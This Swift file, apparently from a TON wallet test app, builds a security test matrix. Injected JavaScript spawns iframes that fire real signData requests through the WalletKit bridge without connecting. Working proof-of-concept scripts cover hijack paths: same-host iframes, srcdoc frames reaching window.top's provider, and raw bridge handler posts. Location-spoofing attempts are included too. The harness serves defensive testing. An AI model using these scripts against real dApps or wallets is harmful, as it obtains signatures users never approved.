//
//  RealBridgeIframeCase.swift
//  TONWalletApp
//
//  Created by Nikita Rodionov on 05.06.2026.
//
//  Copyright (c) 2026 TON Connect
//
//  Iframe-security matrix against the REAL WalletKit injected bridge.
//
//  Mechanism under test (walletkit-ios-bridge.mjs `handleBridgeEvent`): an
//  injected `send` (signData) with no `from` is matched to a connected session
//  BY DOMAIN. That domain is computed natively from WKFrameInfo.request.url host
//  (WKWebView+Injection.swift) — JS cannot forge it. If a session matches, the
//  wallet is resolved and the native sign-data sheet appears; otherwise the SDK
//  throws WALLET_REQUIRED and nothing is shown.
//
//  Consequence:
//   • same-host navigated iframe  → domain matches → SHEET APPEARS (hijack)
//   • data: / srcdoc / cross-host → domain differs → REJECTED (secure boundary)
//
//  Each malicious frame calls window.ton.tonconnect.send({ method:'signData' })
//  — a complete TonConnect request — without ever performing a connect.
//

import Foundation

enum RealBridgeIframeCase: String, CaseIterable, Identifiable {
    case baselineMain
    case sameOriginNavigated
    case sameOriginNested
    case crossOriginData
    case locationSpoof
    case srcdoc
    case srcdocViaParent
    case sandboxed

    var id: String { rawValue }

    /// dApp origin the screen loads. The same-host cases navigate to a path on it.
    static let dappOrigin = "https://tonconnect-sdk-demo-dapp.vercel.app"
    static let sameOriginURL = "\(dappOrigin)/iframe/iframe"

    var shortTitle: String {
        switch self {
        case .baselineMain:       return "Main"
        case .sameOriginNavigated: return "Same-origin"
        case .sameOriginNested:    return "Nested SO"
        case .crossOriginData:     return "data:"
        case .locationSpoof:       return "Location spoof"
        case .srcdoc:              return "srcdoc"
        case .srcdocViaParent:     return "srcdoc→parent"
        case .sandboxed:           return "sandboxed"
        }
    }

    var title: String {
        switch self {
        case .baselineMain:        return "Baseline — main dApp frame (legit)"
        case .sameOriginNavigated: return "Same-host navigated iframe — HIJACK"
        case .sameOriginNested:    return "Nested same-host iframes — HIJACK"
        case .crossOriginData:     return "Cross-origin data: iframe"
        case .locationSpoof:       return "Location/origin spoof attempt"
        case .srcdoc:              return "srcdoc iframe"
        case .srcdocViaParent:     return "srcdoc + window.parent bypass — HIJACK"
        case .sandboxed:           return "Sandboxed iframe"
        }
    }

    /// Whether the native sign-data sheet is expected to appear (i.e. the request
    /// resolves to the connected session by domain).
    var expectsSheet: Bool {
        switch self {
        case .baselineMain, .sameOriginNavigated, .sameOriginNested, .srcdocViaParent:
            return true
        case .crossOriginData, .locationSpoof, .srcdoc, .sandboxed:
            return false
        }
    }

    var expectation: String {
        switch self {
        case .baselineMain, .sameOriginNavigated, .sameOriginNested:
            return "Expected: native sign-data sheet APPEARS (domain matches the connected session)."
        case .srcdocViaParent:
            return "Expected: sheet APPEARS — the call runs in the parent (window.top), so it is attributed to the main frame. The per-frame srcdoc rejection is bypassed."
        case .crossOriginData, .srcdoc, .sandboxed:
            return "Expected: REJECTED (frame domain ≠ connected domain) — no sheet."
        case .locationSpoof:
            return "Expected: every spoof attempt BLOCKED or no-op; native domain unchanged → REJECTED."
        }
    }

    var summary: String {
        switch self {
        case .baselineMain:
            return "Fires a real signData from the main dApp frame itself — the frame that actually connected. Reference for the legitimate path."
        case .sameOriginNavigated:
            return "An iframe navigated to a path on the SAME host as the dApp. Its native domain equals the connected session's domain, so the bridge resolves the wallet and signs — even though this frame never connected. The script is injected into it (same-origin)."
        case .sameOriginNested:
            return "Same-host iframe nested inside another same-host iframe. The deepest frame's domain still equals the dApp's, so the request is honored."
        case .crossOriginData:
            return "Opaque-origin data: iframe sends a complete signData. Its native domain is data:, not the dApp's, so the session lookup fails and the SDK rejects it."
        case .srcdoc:
            return "srcdoc iframe shares the parent SECURITY-origin, but its request.url domain is about:srcdoc — which is what the bridge keys on — so it is rejected. Demonstrates the request.url-vs-securityOrigin gap."
        case .srcdocViaParent:
            return "A srcdoc iframe (same security-origin as the parent) does NOT call its own provider — it reaches window.top.ton.tonconnect. That call runs in the PARENT's context, so the bridge attributes it to the main frame and signs. Shows that rejecting srcdoc's own request.url is bypassable via the parent — same-origin frames can always reach the wallet through the top frame."
        case .sandboxed:
            return "sandbox=\"allow-scripts\" frame (opaque, no allow-same-origin). May lack the injected provider; if present, its domain still won't match — rejected."
        case .locationSpoof:
            return "An opaque data: frame tries to make itself look like the dApp before signing: history.replaceState to the dApp URL, document.domain, location.hash, redefining window.location. Each attempt is logged. Then it sends signData. The native domain is taken from WKFrameInfo (not JS location), so the spoof can't change it."
        }
    }

    /// JavaScript evaluated in the dApp main frame: builds the topology and wires
    /// the real signData. Self-contained (defines its own overlay panel).
    var spawnJS: String {
        let body: String
        switch self {
        case .baselineMain:
            body = """
            (function(){
              var LBL='MAIN-DAPP';
              function log(a,e){try{window.webkit.messageHandlers.iframeSecLog.postMessage({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()});}catch(x){}}
              var p=(window.ton&&window.ton.tonconnect)||\(Self.altProviderExpr);
              if(!p){log('NO PROVIDER IN MAIN FRAME');return;}
              log('signData(real) sent from MAIN frame →');
              p.send({method:'signData',params:[JSON.stringify({type:'text',text:'Legit signData from main dApp frame'})],id:String(Date.now())})
               .then(function(r){log('RESOLVED ✓ wallet signed',JSON.stringify(r).slice(0,180));})
               .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,180));});
            })();
            """

        case .sameOriginNavigated:
            let script = Self.realSendScript(
                label: "SAME-ORIGIN-IFRAME",
                note: "Navigated to a path on the dApp host. Never connected.",
                autofire: true
            )
            body = """
            (function(){
              var SRC=\(Self.jsLiteral(script));
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.src=\(Self.jsLiteral(Self.sameOriginURL));
              f.addEventListener('load',function(){
                if(!\(Self.injectExpr("f.contentWindow", "SRC"))){
                  try{window.webkit.messageHandlers.iframeSecLog.postMessage({frameLabel:'SAME-ORIGIN-IFRAME',action:'CANNOT INJECT (treated cross-origin)',claimedOrigin:(location.origin||'null'),ts:Date.now()});}catch(x){}
                }
              });
              __ifsecAdd(f);
            })();
            """

        case .sameOriginNested:
            let inner = Self.realSendScript(
                label: "NESTED-IFRAME-B (depth 2, same host)",
                note: "Deepest same-host frame. Never connected.",
                autofire: true
            )
            let builder = """
            (function(){
              var INNER=\(Self.jsLiteral(inner));
              var f2=document.createElement('iframe');
              f2.style.cssText='width:100%;border:0;min-height:200px;background:#fff;border-radius:8px;margin-top:6px';
              f2.src=\(Self.jsLiteral(Self.sameOriginURL));
              f2.addEventListener('load',function(){ \(Self.injectExpr("f2.contentWindow", "INNER")); });
              (document.body||document.documentElement).appendChild(f2);
            })();
            """
            body = """
            (function(){
              var BUILDER=\(Self.jsLiteral(builder));
              var f=document.createElement('iframe');
              f.style.cssText='width:100%;border:0;min-height:320px;background:#fff;border-radius:8px;margin-top:6px';
              f.src=\(Self.jsLiteral(Self.sameOriginURL));
              f.addEventListener('load',function(){ \(Self.injectExpr("f.contentWindow", "BUILDER")); });
              __ifsecAdd(f);
            })();
            """

        case .crossOriginData:
            let html = Self.selfContainedDoc(
                label: "DATA-IFRAME",
                bg: "#ffe5cf", border: "#ff9b5b",
                note: "Opaque origin. Domain = data:. Never connected."
            )
            body = """
            (function(){
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.src=\(Self.jsLiteral(Self.dataURL(html)));
              __ifsecAdd(f);
            })();
            """

        case .locationSpoof:
            let html = Self.selfContainedDoc(
                label: "LOCATION-SPOOF",
                bg: "#ffe0e0", border: "#ff5b5b",
                note: "Tries to fake its location to the dApp domain, then signs.",
                preamble: Self.locationSpoofPreamble
            )
            body = """
            (function(){
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.src=\(Self.jsLiteral(Self.dataURL(html)));
              __ifsecAdd(f);
            })();
            """

        case .srcdoc:
            let html = Self.selfContainedDoc(
                label: "SRCDOC-IFRAME",
                bg: "#ffe5cf", border: "#ff9b5b",
                note: "Shares security-origin, but request.url domain is about:srcdoc."
            )
            body = """
            (function(){
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.setAttribute('srcdoc', \(Self.jsLiteral(html)));
              __ifsecAdd(f);
            })();
            """

        case .srcdocViaParent:
            let html = Self.parentBypassDoc(
                label: "SRCDOC-VIA-PARENT",
                note: "Same-origin as parent → reaches window.top.ton.tonconnect, bypassing the per-frame check."
            )
            body = """
            (function(){
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.setAttribute('srcdoc', \(Self.jsLiteral(html)));
              __ifsecAdd(f);
            })();
            """

        case .sandboxed:
            let html = Self.selfContainedDoc(
                label: "SANDBOXED-IFRAME",
                bg: "#ffe5cf", border: "#ff9b5b",
                note: "sandbox=allow-scripts. Opaque origin; provider may be absent."
            )
            body = """
            (function(){
              var f=document.createElement('iframe');
              \(Self.frameStyle("f"))
              f.setAttribute('sandbox','allow-scripts');
              f.setAttribute('srcdoc', \(Self.jsLiteral(html)));
              __ifsecAdd(f);
            })();
            """
        }

        return Self.panelPrelude + body
    }

    // MARK: - JS / HTML building blocks

    private static let altProviderExpr =
        "(window.walletKitDemoWallet&&window.walletKitDemoWallet.tonconnect)"

    /// Runs inside the frame (with `log` in scope) before the signData fires.
    /// Attempts to fake the frame's location/origin without navigating, and logs
    /// the result of each technique so it's visible which are blocked / no-ops.
    private static let locationSpoofPreamble = """
    (function(){
      var DAPP='\(dappOrigin)';
      function attempt(name, fn){
        try{ var r=fn(); log('spoof: '+name+' → OK', String(r).slice(0,80)); }
        catch(e){ log('spoof: '+name+' → BLOCKED', ((e&&e.name)||'')+': '+((e&&e.message)||String(e)).slice(0,90)); }
      }
      log('before spoof', 'origin='+(location.origin||'null')+' href='+location.href);
      attempt('history.replaceState(DAPP)', function(){ history.replaceState(null,'',DAPP+'/'); return location.href; });
      attempt('history.pushState(/spoofed)', function(){ history.pushState(null,'','/spoofed'); return location.href; });
      attempt("document.domain='"+DAPP.replace('https://','')+"'", function(){ document.domain=DAPP.replace('https://',''); return document.domain; });
      attempt('location.hash=DAPP', function(){ location.hash='#'+DAPP; return location.hash; });
      attempt('redefine window.location', function(){ Object.defineProperty(window,'location',{value:{href:DAPP,origin:DAPP}}); return window.location.href; });
      log('after spoof', 'origin='+(location.origin||'null')+' href='+location.href);
    })();
    """

    /// Idempotent overlay-panel helpers, prepended to every case's spawn JS.
    private static let panelPrelude = """
    (function(){
      if(window.__ifsecAdd) return;
      function ensurePanel(){
        var p=document.getElementById('__ifsec_panel');
        if(!p){
          p=document.createElement('div');
          p.id='__ifsec_panel';
          p.style.cssText='position:fixed;left:0;right:0;bottom:0;z-index:2147483647;max-height:55%;overflow:auto;background:rgba(20,20,22,.96);padding:8px;border-top:3px solid #ff3b30;box-sizing:border-box';
          var bar=document.createElement('div');
          bar.style.cssText='display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;position:sticky;top:0';
          bar.innerHTML='<span style="color:#fff;font:700 12px -apple-system">🛡 INJECTED ATTACK FRAMES</span>';
          var x=document.createElement('button');
          x.textContent='✕ clear';
          x.style.cssText='padding:4px 8px;border:0;border-radius:6px;background:#444;color:#fff;font:12px -apple-system';
          x.onclick=function(){ p.remove(); };
          bar.appendChild(x);
          p.appendChild(bar);
          document.body.appendChild(p);
        }
        return p;
      }
      window.__ifsecClear=function(){ var p=document.getElementById('__ifsec_panel'); if(p) p.remove(); };
      window.__ifsecAdd=function(node){ ensurePanel().appendChild(node); };
    })();
    """

    private static func frameStyle(_ varName: String) -> String {
        "\(varName).style.cssText='width:100%;border:0;min-height:150px;background:#fff;border-radius:8px;margin-top:6px';"
    }

    /// JS expression (returns bool) that injects `scriptVar` as a <script> into the
    /// same-origin `frameWindowExpr`. Returns false if access throws (cross-origin).
    private static func injectExpr(_ frameWindowExpr: String, _ scriptVar: String) -> String {
        "(function(){try{var d=\(frameWindowExpr).document;var s=d.createElement('script');s.textContent=\(scriptVar);(d.body||d.documentElement).appendChild(s);return true;}catch(e){return false;}})()"
    }

    /// A script that, when run inside a frame, renders an overlay with a button and
    /// (optionally) auto-fires a real signData using that frame's injected provider.
    /// `preamble` runs (with `log` in scope) right before the auto-fire — used to
    /// attempt location/origin spoofing and record the results.
    static func realSendScript(label: String, note: String, autofire: Bool, preamble: String = "") -> String {
        """
        (function(){
          var LBL=\(jsLiteral(label)); var NOTE=\(jsLiteral(note)); var AUTO=\(autofire ? "true" : "false");
          function log(a,e){try{window.webkit.messageHandlers.iframeSecLog.postMessage({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()});}catch(x){}}
          var box=document.createElement('div');
          box.style.cssText='position:fixed;inset:0;z-index:99999;background:#ffe5cf;color:#1d1d1f;font:13px -apple-system;padding:10px;box-sizing:border-box;border:2px solid #ff9b5b;overflow:auto';
          box.innerHTML='<div style="font-weight:700;font-size:12px">'+LBL+'</div>'+
            '<div style="font:11px ui-monospace;color:#444;margin:6px 0;word-break:break-all">origin: '+(location.origin||'null')+'<br>url: '+location.href+'</div>'+
            '<button id="__ifsec_go" style="padding:7px 11px;border:0;border-radius:6px;background:#ff3b30;color:#fff;font-size:12px">Send REAL signData</button>'+
            '<div style="font-size:11px;color:#7a3b00;margin-top:6px">'+NOTE+'</div>';
          (document.body||document.documentElement).appendChild(box);
          function rid(){ try{ return (window.id)||(crypto&&crypto.randomUUID?crypto.randomUUID():String(Date.now())); }catch(e){ return String(Date.now()); } }
          function realSend(){
            var appReq={method:'signData',params:[JSON.stringify({type:'text',text:'UNCONNECTED frame ['+LBL+'] signed @ '+location.href})],id:String(Date.now())};
            var p=(window.ton&&window.ton.tonconnect)||(window.walletKitDemoWallet&&window.walletKitDemoWallet.tonconnect);
            if(p){
              log('signData(real) via provider →');
              p.send(appReq)
               .then(function(r){log('RESOLVED ✓ wallet signed',JSON.stringify(r).slice(0,180));})
               .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,180));});
              return;
            }
            // No high-level provider in this frame (e.g. WebKit doesn't run the
            // injection user-script in data: subframes). The native message handler
            // is shared across all frames, so post the raw transport message — the
            // request still reaches the bridge and is judged by the frame's native domain.
            var h=window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.walletKitInjectionBridge;
            if(!h){ log('NO PROVIDER AND NO BRIDGE HANDLER IN FRAME'); return; }
            log('signData(real) via RAW handler (no provider) →');
            try{
              h.postMessage({method:'send',params:[appReq],frameID:rid(),timeout:300000})
               .then(function(r){log('RESOLVED ✓ wallet signed',JSON.stringify(r).slice(0,180));})
               .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,180));});
            }catch(e){ log('RAW handler threw',String(e).slice(0,180)); }
          }
          var b=document.getElementById('__ifsec_go'); if(b) b.addEventListener('click',realSend);
          \(preamble)
          if(AUTO) setTimeout(realSend,400);
        })();
        """
    }

    /// A self-contained malicious-frame document (for data:/srcdoc/sandboxed) that
    /// embeds the real-send script inline and auto-fires.
    private static func selfContainedDoc(label: String, bg: String, border: String, note: String, preamble: String = "") -> String {
        let script = realSendScript(label: label, note: note, autofire: true, preamble: preamble)
        return """
        <!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>\
        <body style="margin:0;background:\(bg);border:2px solid \(border);box-sizing:border-box">\
        <script>\(script)</script></body></html>
        """
    }

    /// A srcdoc document that does NOT use its own provider. Because srcdoc is same-origin
    /// with the parent, it reaches `window.top.ton.tonconnect` — that send runs in the
    /// parent's realm and is attributed to the main frame, bypassing the per-frame check.
    private static func parentBypassDoc(label: String, note: String) -> String {
        let script = """
        (function(){
          var LBL=\(jsLiteral(label)); var NOTE=\(jsLiteral(note));
          function log(a,e){try{window.webkit.messageHandlers.iframeSecLog.postMessage({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()});}catch(x){}}
          var box=document.createElement('div');
          box.style.cssText='position:fixed;inset:0;z-index:99999;background:#ffe0c0;color:#1d1d1f;font:13px -apple-system;padding:10px;box-sizing:border-box;border:2px solid #ff7b2b;overflow:auto';
          box.innerHTML='<div style="font-weight:700;font-size:12px">'+LBL+'</div>'+
            '<div style="font:11px ui-monospace;color:#444;margin:6px 0;word-break:break-all">origin: '+(location.origin||'null')+'<br>url: '+location.href+'</div>'+
            '<button id="__ifsec_go" style="padding:7px 11px;border:0;border-radius:6px;background:#ff3b30;color:#fff;font-size:12px">Send via window.top.ton</button>'+
            '<div style="font-size:11px;color:#7a3b00;margin-top:6px">'+NOTE+'</div>';
          (document.body||document.documentElement).appendChild(box);
          function realSend(){
            var appReq={method:'signData',params:[JSON.stringify({type:'text',text:'srcdoc → window.top.ton bypass @ '+location.href})],id:String(Date.now())};
            var pp=null;
            try{ pp=(window.top&&window.top.ton&&window.top.ton.tonconnect)||(window.parent&&window.parent.ton&&window.parent.ton.tonconnect); }
            catch(e){ log('parent/top provider NOT accessible (cross-origin)', String(e).slice(0,160)); }
            if(pp){
              log('reaching window.top.ton.tonconnect (same-origin bypass) →');
              pp.send(appReq)
               .then(function(r){log('RESOLVED ✓ signed via PARENT (bypass worked)',JSON.stringify(r).slice(0,160));})
               .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,160));});
              return;
            }
            var own=(window.ton&&window.ton.tonconnect);
            if(own){
              log('no parent access; trying OWN srcdoc provider (bridge should REJECT) →');
              own.send(appReq).then(function(r){log('RESOLVED ✓ (own)',JSON.stringify(r).slice(0,160));}).catch(function(e){log('REJECTED ✗ (own)',(e&&e.message?e.message:String(e)).slice(0,160));});
              return;
            }
            log('NO PARENT AND NO OWN PROVIDER');
          }
          var b=document.getElementById('__ifsec_go'); if(b) b.addEventListener('click',realSend);
          setTimeout(realSend,500);
        })();
        """
        return """
        <!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>\
        <body style="margin:0;background:#ffe0c0;border:2px solid #ff7b2b;box-sizing:border-box">\
        <script>\(script)</script></body></html>
        """
    }

    private static func dataURL(_ html: String) -> String {
        "data:text/html;charset=utf-8;base64,\(Data(html.utf8).base64EncodedString())"
    }

    /// Encode a Swift string as a valid JS string literal (handles quotes, newlines, unicode).
    static func jsLiteral(_ string: String) -> String {
        guard let data = try? JSONEncoder().encode(string),
              let str = String(data: data, encoding: .utf8) else {
            return "\"\""
        }
        return str
    }
}
